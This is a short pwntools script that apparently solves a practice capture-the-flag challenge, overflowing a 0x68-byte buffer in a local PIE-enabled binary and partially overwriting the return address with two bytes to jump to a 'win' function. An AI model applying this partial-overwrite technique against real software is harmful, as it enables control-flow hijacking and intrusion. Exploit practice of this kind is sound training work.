from pwn import *

'''
[*] '/challenge/binary-exploitation-pie-overflow'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''
r = process('/challenge/binary-exploitation-pie-overflow')
save_addr = 0x21c6
#0000000000002140 <main>:
main_offset = 0x2140
win_offset = 0x1f37
offset = 0x60 + 8
payload = offset * b'A' + b'\x37\x1f' #+ b'\x21'
print(r.recvline().decode())
r.send(payload )
r.interactive()
# main + 0x86

